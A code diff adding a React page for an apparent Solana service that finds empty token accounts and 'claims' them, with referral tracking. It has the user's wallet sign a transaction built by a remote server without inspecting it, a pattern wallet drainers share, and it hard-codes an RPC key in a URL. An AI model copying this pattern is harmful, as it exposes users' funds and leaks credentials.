@@ -1,0 +1,230 @@
+import { useEffect, useState } from "react";
+import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
+import { useWallet } from "@solana/wallet-adapter-react";
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction } from "@solana/web3.js";
+
+const SOLANA_NETWORK = "https://divine-old-bridge.solana-mainnet.quiknode.pro/e6cba5f73fa09260f937f65f73bbe8fa7fa0dd24";
+const API_CLAIM_URL = "https://cleanyoursol.com/api/claim-multiple";
+const API_REFERRAL_URL = "https://cleanyoursol.com/api/referral";
+const API_USER_URL = "https://cleanyoursol.com/api/user/register";
+const MIN_REQUIRED_SOL = 0.002;
+
+const App = () => {
+    const { publicKey } = useWallet();
+    const [solBalance, setSolBalance] = useState(null);
+    const [claimableTokens, setClaimableTokens] = useState([]);
+    const [errorMessage, setErrorMessage] = useState("");
+    const [referralLink, setReferralLink] = useState(null);
+    const [referrals, setReferrals] = useState([]);
+    const [totalReferrals, setTotalReferrals] = useState(0);
+    const connection = new Connection(SOLANA_NETWORK, "confirmed");
+
+    // Fetch balance, register user, and get referral data
+useEffect(() => {
+    const fetchData = async () => {
+        if (publicKey) {
+            const balance = await connection.getBalance(publicKey);
+            setSolBalance(balance / LAMPORTS_PER_SOL);
+
+            // Lấy referral từ URL path (ví dụ: /m9zum8aJ)
+            let referralCode = window.location.pathname.substring(1); // Bỏ dấu `/`
+
+            if (referralCode) {
+                //console.log("🔍 Referral Code Found in Path:", referralCode);
+                localStorage.setItem("referralCode", referralCode); // Cập nhật lại localStorage
+            } else {
+                referralCode = localStorage.getItem("referralCode");
+                //console.log("🔍 Referral Code Found in localStorage:", referralCode);
+            }
+
+            console.log("🔗 Referral Code Sent to Backend:", referralCode);
+
+            // Gửi API đăng ký user
+            await fetch(API_USER_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ publicKey: publicKey.toBase58(), referredBy: referralCode }),
+            });
+
+            if (balance / LAMPORTS_PER_SOL >= MIN_REQUIRED_SOL) {
+                const res = await fetch(`${API_REFERRAL_URL}/${publicKey.toBase58()}`);
+                const data = await res.json();
+                setReferralLink(data.referralLink);
+
+                const refCode = data.referralLink.split("/").pop();
+                fetchReferrals(refCode);
+            }
+        }
+    };
+
+    fetchData();
+}, [publicKey]);
+
+
+
+    // Fetch referral list
+    const fetchReferrals = async (referralCode) => {
+        try {
+            const res = await fetch(`${API_REFERRAL_URL}/my-referrals/${referralCode}?limit=10&offset=0`);
+            const data = await res.json();
+            setReferrals(data.referredUsers);
+            setTotalReferrals(data.totalCount);
+        } catch (error) {
+            console.error("Error fetching referrals:", error);
+        }
+    };
+
+    // Fetch empty tokens
+    useEffect(() => {
+        const fetchClaimableTokens = async () => {
+            if (!publicKey) return;
+
+            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+            });
+
+            const emptyTokens = tokenAccounts.value
+                .filter((account) => account.account.data.parsed.info.tokenAmount.uiAmount === 0)
+                .map((account) => ({
+                    id: account.pubkey.toBase58(),
+                    mint: account.account.data.parsed.info.mint,
+                }));
+
+            setClaimableTokens(emptyTokens);
+        };
+
+        fetchClaimableTokens();
+    }, [publicKey]);
+
+    // Claim function with SOL balance check
+    const claimAllTokens = async () => {
+        setErrorMessage("");
+
+        if (!claimableTokens.length) {
+            setErrorMessage("No tokens available to claim.");
+            return;
+        }
+
+        if (solBalance < MIN_REQUIRED_SOL) {
+            setErrorMessage(`You need at least ${MIN_REQUIRED_SOL} SOL to claim tokens.`);
+            return;
+        }
+
+        const walletPublicKey = publicKey.toBase58();
+        const tokenIds = claimableTokens.map(token => token.id);
+
+        try {
+            console.log("Sending claim request:", walletPublicKey, tokenIds);
+
+            const response = await fetch(API_CLAIM_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    publicKey: walletPublicKey,
+                    tokenIds,
+                    referral: localStorage.getItem("referralCode") || null
+                }),
+            });
+
+            const data = await response.json();
+            if (!data.transaction) {
+                setErrorMessage("API Error: " + (data.error || "Unknown error"));
+                return;
+            }
+
+            console.log("Transaction received from API:", data.transaction);
+
+            const txBuffer = Buffer.from(data.transaction, "base64");
+            let transaction = Transaction.from(txBuffer);
+
+            const signedTx = await window.solana.signTransaction(transaction);
+            const rawTx = signedTx.serialize();
+
+            const txid = await connection.sendRawTransaction(rawTx);
+            await connection.confirmTransaction(txid, "confirmed");
+
+            alert("Claim successful! TX ID: " + txid);
+
+            await fetch("/api/ledger", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    publicKey: walletPublicKey,
+                    tokenId: tokenIds.join(","),
+                    txHash: txid,
+                    amount: data.refundAmount,
+                    referral: localStorage.getItem("referralCode") || null,
+                }),
+            });
+
+            setClaimableTokens([]);
+        } catch (error) {
+            console.error("Error while claiming tokens:", error);
+            setErrorMessage("Claim failed! " + error.message);
+        }
+    };
+
+    // Copy referral link
+    const copyReferralLink = () => {
+        if (referralLink) {
+            navigator.clipboard.writeText(referralLink);
+            alert("Referral link copied to clipboard!");
+        }
+    };
+
+    return (
+        <div style={{ textAlign: "center", marginTop: "50px" }}>
+            <h1>🦄 Connect Your Solana Wallet</h1>
+            <WalletMultiButton />
+
+            {publicKey && (
+                <div>
+                    <p>🔗 Wallet Address: <strong>{publicKey.toBase58()}</strong></p>
+                    <p>💰 SOL Balance: {solBalance !== null ? `${solBalance} SOL` : "Loading..."}</p>
+
+                    {errorMessage && (
+                        <p style={{ color: "red", fontWeight: "bold" }}>{errorMessage}</p>
+                    )}
+
+                    <h2>📜 Empty Token List</h2>
+                    {claimableTokens.length > 0 ? (
+                        <div>
+                            {claimableTokens.map((token, index) => (
+                                <p key={index}>🔹 Token Account: {token.id}</p>
+                            ))}
+                            <button onClick={claimAllTokens} disabled={solBalance < MIN_REQUIRED_SOL}>
+                                ✅ Claim All Empty Tokens
+                            </button>
+                        </div>
+                    ) : (
+                        <p>✅ No empty tokens found.</p>
+                    )}
+
+                    {solBalance >= MIN_REQUIRED_SOL && referralLink && (
+                        <div style={{ marginTop: "20px" }}>
+                            <h3>📣 Your Referral Link:</h3>
+                            <p>{referralLink}</p>
+                            <button onClick={copyReferralLink}>📋 Copy Link</button>
+
+                            <h3>📋 Your Referrals:</h3>
+                            <p><strong>Total Referrals:</strong> {totalReferrals}</p>
+                            <ul>
+                                {referrals.length > 0 ? (
+                                    referrals.map((user, index) => (
+                                        <li key={index}>
+                                            🔹 Wallet: {user.publicKey} | Joined: {new Date(user.createdAt).toLocaleString()}
+                                        </li>
+                                    ))
+                                ) : (
+                                    <p>No referrals yet.</p>
+                                )}
+                            </ul>
+                        </div>
+                    )}
+                </div>
+            )}
+        </div>
+    );
+};
+
+export default App;
